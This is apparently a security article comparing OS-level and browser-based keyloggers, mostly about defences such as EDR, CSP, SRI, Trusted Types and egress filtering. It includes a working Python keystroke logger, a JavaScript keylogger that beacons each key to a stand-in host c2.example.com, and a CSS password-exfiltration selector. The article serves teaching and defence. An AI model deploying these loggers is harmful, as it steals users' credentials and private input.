The Silent Witness: OS-Level vs. Web-Based Keyloggers

When most people imagine a keylogger, they picture a shadowy piece of malware silently recording every password, message, and credit card number typed into a computer. That image is accurate — but only half the story.

The reality is that keyloggers come in two fundamentally different flavors: OS-level and web-based. They operate at completely different layers of the stack, with different capabilities, different persistence mechanisms, and — most importantly — different defenses.

This article breaks down both approaches, compares them head-to-head, and provides actionable defenses for blue teams and individuals alike.

1. OS-Level Keyloggers: The Full-Capture Beast

What it is: An OS-level keylogger hooks directly into the operating system's input handling pipeline. It captures every keystroke regardless of which application has focus — browser, terminal, password manager, VPN client, everything.

How it works at the system level:

  • Windows: Uses SetWindowsHookEx with WH_KEYBOARD_LL (low-level keyboard hook) or a kernel-mode driver that intercepts IRP (I/O Request Packet) handlers.
  • Linux: Reads directly from /dev/input/event* devices or uses libevdev to capture input events before they reach user space.
  • macOS: Uses CGEventTap (Quartz Event Services) at the Core Graphics level or IOKit HID drivers for kernel-level capture.
Proof of Concept — Python (Cross-Platform):

from pynput import keyboard

def on_press(key):
    try:
        with open("captures.log", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("captures.log", "a") as f:
            f.write(f"[{key.name.upper()}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

Capabilities:
• Captures ALL keystrokes system-wide
• Runs as a background process (hidden)
• Survives reboot via Registry / cron / LaunchDaemon
• Can exfiltrate via encrypted C2, DNS tunneling, or SMTP

What an attacker achieves: Complete credential harvesting across all applications. Passwords typed into browsers, terminal sessions, password managers, RDP clients, and VPNs are all captured indiscriminately.

2. Web-Based Keyloggers: The Sandboxed Spy

What it is: A web-based keylogger operates entirely within the browser's security sandbox. It cannot capture keystrokes outside the browser, cannot access the filesystem, and cannot install OS-level persistence. But it is significantly easier to deploy — delivered via a single URL, XSS payload, or compromised webpage.

How it works at the browser level:

  • JavaScript keydown/keyup events: Attach event listeners to the document that capture every keystroke typed into form fields, search bars, and chat windows within the page.
  • CSS attribute exfiltration: Use input[value^="a"] { background: url(/leak?p=a); } to leak password field values character-by-character — no JavaScript required. This bypasses some CSP policies.
  • Service Worker injection: Register a Service Worker that re-injects the logger into every page the victim navigates to on the same origin, surviving page loads without re-exploitation.
  • Exfiltration via image beacon: Data is sent to a C2 server using new Image().src = ... or navigator.sendBeacon() — both stealthy and hard to distinguish from normal web traffic.
Proof of Concept — JavaScript Keylogger:

let buffer = [];

document.addEventListener('keydown', function(e) {
    const key = e.key;
    const field = e.target.name || 'unknown';
    
    buffer.push({ t: Date.now(), k: key, f: field });
    
    // Exfiltrate via image beacon
    new Image().src = 'https://c2.example.com/collect?d=' +
        btoa(JSON.stringify({ k: key, f: field }));
});

Capabilities:
• Captures keystrokes only within the browser tab
• No binary — delivered via URL or XSS injection
• Cross-platform (any browser, any OS)
• Can survive same-origin navigation via Service Workers

What an attacker achieves: Harvesting of credentials entered into web forms — login pages, payment forms, search queries, and chat messages. Combined with session hijacking, this can yield full account takeover even when MFA is present (by capturing the OTP as it is typed).

3. The Critical Differences at a Glance

What it is: These two approaches operate at fundamentally different layers of the technology stack. Understanding the gap between them is essential for building realistic threat models and deploying appropriate defenses.

Comparison Table:

Capture Scope:
• OS-Level: All keystrokes system-wide (browser, terminal, password manager, VPN)
• Web-Based: Only within the browser tab where the payload executes

Persistence:
• OS-Level: Registry, cron, LaunchDaemon — survives reboot
• Web-Based: Service Worker (same-origin only, limited survival)

Stealth:
• OS-Level: Highly stealthy — kernel hooks, process hollowing, rootkit hiding
• Web-Based: Low stealth — visible in DevTools, detectable via CSP/SRI

Privilege Required:
• OS-Level: User-level minimum; SYSTEM for maximum stealth
• Web-Based: None — runs entirely in browser sandbox

Deployment Method:
• OS-Level: Requires executable delivery (phishing attachment, USB drop, exploit kit)
• Web-Based: Delivered via URL (XSS, watering hole, compromised CDN)

Detectability:
• OS-Level: High difficulty — EDR bypass, DKOM, rootkits
• Web-Based: Low difficulty — CSP, SRI, DevTools auditing

Evades EDR/AV?
• OS-Level: Possibly — depends on implementation and privilege level
• Web-Based: Yes — no binary to scan

Forensic Footprint:
• OS-Level: Binary on disk, driver load, process list entries
• Web-Based: Network logs, SW cache, IndexedDB artifacts

4. How to Protect Yourself: Defenses for Individuals and Organizations

What it is: Defending against keyloggers requires a layered approach. No single control stops both OS-level and web-based variants. The following recommendations cover both attack surfaces.

4.1 Defenses Against OS-Level Keyloggers

Endpoint Detection and Response (EDR): Modern EDR solutions monitor for SetWindowsHookEx API calls (Sysmon Event ID 8), unusual /dev/input/event* readers on Linux, and suspicious CGEventTap registrations on macOS. Deploy EDR on all managed endpoints.

Application Control (Allowlisting): Windows AppLocker or WDAC (Windows Defender Application Control) can block unauthorized executables from running — including keylogger binaries delivered via phishing. Linux users can enforce SELinux or AppArmor policies.

Driver Signature Enforcement: On Windows, enable Secure Boot and Driver Signature Enforcement to block unsigned kernel-mode drivers. This prevents rootkit-level keyloggers from loading.

Regular Auditing:

  • Windows: Run driverquery /v | findstr -i keyboard to check for suspicious keyboard drivers. Review running processes with tasklist /v for renamed/masqueraded processes.
  • Linux: Run fuser /dev/input/event* to see which processes are reading input devices. Check lsof | grep /dev/input for unexpected readers. Review systemctl list-units for unknown services.
  • macOS: Check launchctl list for suspicious LaunchAgents. Review kextstat | grep -v com.apple for third-party kernel extensions.

Password Managers with Auto-Fill: Using a password manager that auto-fills credentials without typing them (using browser extension APIs rather than simulating keystrokes) defeats OS-level keyloggers entirely. The password never passes through the keyboard input stack.

Two-Factor Authentication (MFA): Even if credentials are captured, MFA provides a second layer of defense. Hardware tokens (YubiKey) or app-based TOTP are preferred over SMS, which can be intercepted. Note: OTP codes typed into a login form are still captured — use push-based MFA or WebAuthn where possible.

4.2 Defenses Against Web-Based Keyloggers

Content Security Policy (CSP): This is the single most effective defense against web-based keyloggers. A properly configured CSP blocks inline scripts, restricts image sources (preventing beacon exfiltration), and limits connect-src (preventing sendBeacon and WebSocket leaks).

CSP Header — Blocks Web-Based Keyloggers:

Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self'; connect-src 'self'; worker-src 'self';

What this blocks:
• Inline JavaScript keyloggers (requires 'unsafe-inline' which should be avoided)
• Image beacons to external C2 servers
• sendBeacon to external origins
• Service Workers from external domains
• CSS attribute-based exfiltration (if img-src is restricted)

Subresource Integrity (SRI): Every script and stylesheet loaded from a CDN should include an integrity hash. If the CDN is compromised and the keylogger is injected into a library, SRI causes the browser to reject the modified file.

SRI Example:

<script src="https://cdn.example.com/app.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
    crossorigin="anonymous"></script>

Trusted Types (CSP Enforcement): Trusted Types is a browser API that prevents DOM XSS by restricting the sources of strings passed to dangerous sinks like innerHTML. This stops keylogger injection via DOM-based XSS.

Trusted Types Header:

Content-Security-Policy: require-trusted-types-for 'script'

Service Worker Monitoring: Browsers allow users to inspect registered Service Workers.

  • Chrome: Navigate to chrome://serviceworker-internals/ to view all registered Service Workers. Unregister any that are unexpected.
  • Firefox: Navigate to about:debugging#/runtime/this-firefox and check the Service Workers section.
  • Programmatic check: Run the following in the browser console:
    navigator.serviceWorker.getRegistrations().then(regs => regs.forEach(r => r.unregister()));

Browser Extensions for Keylogging Detection: Security extensions like NoScript, uBlock Origin, and ScriptSafe can block third-party scripts and inline JavaScript by default, preventing web-based keyloggers from executing unless explicitly whitelisted.

Disable Autofill for Sensitive Fields: While password managers with auto-fill are recommended against OS-level keyloggers, disabling browser-based autofill for credit card numbers and personal information prevents form-harvesting scripts from reading stored values.

4.3 Universal Defenses (Both Types)

Principle of Least Privilege: Run with the minimum privileges necessary. A keylogger running as a standard user cannot install kernel drivers, write to system directories, or survive across user sessions. On Windows, never run as Administrator for daily use.

Keep Software Updated: OS vendors patch kernel-level vulnerabilities that keyloggers exploit. Browser vendors patch XSS vectors, CSP bypasses, and Service Worker vulnerabilities. Regularly apply updates.

Network Segmentation and Egress Filtering: Keyloggers are useless if they cannot exfiltrate data. Block outbound connections to unknown IP addresses and domains at the network perimeter. Use DNS filtering to block connections to known C2 infrastructure.

User Awareness Training: Train users to:

  • Recognize phishing emails that deliver keylogger executables
  • Verify website URLs before entering credentials
  • Report unexpected browser behavior (pop-ups, redirects, slow performance)
  • Avoid downloading software from untrusted sources

Regular Security Assessments: Run internal penetration tests that specifically test for keylogging vulnerabilities — both on endpoints (OS-level) and in web applications (XSS-based). Use the results to close gaps before attackers find them.

5. Putting It All Together: A Realistic Defense Triage

During an internal security assessment, the defense workflow looks like this:

  • Step 1 — CSP audit: Does the web application have a restrictive Content Security Policy? If not, it is vulnerable to web-based keyloggers via XSS. Prioritize implementing CSP script-src 'self'; img-src 'self'; connect-src 'self' with nonces.
  • Step 2 — EDR deployment check: Are all endpoints covered by EDR that monitors for keyboard hook APIs and unusual /dev/input readers? If not, deploy or configure detection rules.
  • Step 3 — Application control audit: Is AppLocker or WDAC enforced on Windows endpoints? If not, unauthorized executables — including keyloggers — can run freely.
  • Step 4 — Password manager deployment: Are users using password managers with auto-fill? If not, implement one. This single control defeats OS-level keyloggers entirely for credential capture.
  • Step 5 — MFA enforcement: Is MFA enforced for all critical systems? Even if credentials are captured, MFA provides a safety net. Prefer hardware tokens or push-based MFA over SMS.
  • Step 6 — Network egress filtering: Are outbound connections restricted to approved domains and IP ranges? If not, keyloggers can easily phone home to C2 servers.
  • Step 7 — Service Worker audit: Check for unexpected Service Workers on production web applications. Unregister any that are not part of the approved codebase.
  • Step 8 — User awareness: Run a simulated phishing campaign with a keylogger payload scenario. Measure click rates and retrain users who fall for it.

6. The Legal and Ethical Framework

What it is: Every discussion of keyloggers — both offensive and defensive — operates within a strict legal and ethical boundary. Understanding this boundary is essential for any security professional.

The key principles:

  • Authorization: Deploying a keylogger on any system requires explicit, documented authorization. In penetration testing, this means a signed Statement of Work defining the scope of testing. Without it, deploying a keylogger is a criminal act — unauthorized computer access, wiretapping, and identity theft in most jurisdictions.
  • Scope limitation: Even with authorization, keyloggers must be deployed only against in-scope targets. Capturing credentials for out-of-scope systems (personal email, social media, banking) introduces legal liability even within an authorized test.
  • Data handling: Captured keystrokes may contain sensitive personal information. Forensic examiners and penetration testers must handle this data with appropriate encryption, access controls, and retention policies. Data minimization applies — collect only what is needed for the assessment.
  • Disclosure: If a keylogger is discovered during an authorized test, it must be disclosed to the client immediately — including the data captured, how far it spread, and the remediation steps needed.
  • Defensive testing: Running these techniques against your own infrastructure for defensive validation is legal and encouraged. Running them against third parties without authorization is not.

Final Thoughts

Keyloggers remain one of the most reliable tools in an attacker's arsenal — and one of the most misunderstood by defenders. The distinction between OS-level and web-based variants is not academic; it determines which defenses work and which fail.

OS-level keyloggers are the heavyweight. They capture everything, persist through reboots, and hide from casual inspection. Defeating them requires endpoint protection, application control, and — most effectively — removing the value of the capture by using password managers with auto-fill and hardware-backed MFA.

Web-based keyloggers are the opportunist. They are limited to the browser sandbox but are trivially deployable via XSS or compromised third-party scripts. Defeating them requires Content Security Policy, Subresource Integrity, and Trusted Types — controls that are often overlooked in web application security.

The defense mindset is everything. For penetration testers, understanding both approaches allows you to test realistically across the full attack surface. For defenders, it closes the gaps that exist at every layer — from the kernel driver to the JavaScript engine.

If you are responsible for organizational security, the recommendation is straightforward: deploy EDR with keyboard hook monitoring, enforce CSP with strict script and image source restrictions, enable AppLocker or WDAC, mandate password managers, and train your users. These few layers close the vast majority of keylogger attack paths — both OS-level and web-based.

Stay sharp. Test thoroughly. Defend every layer.
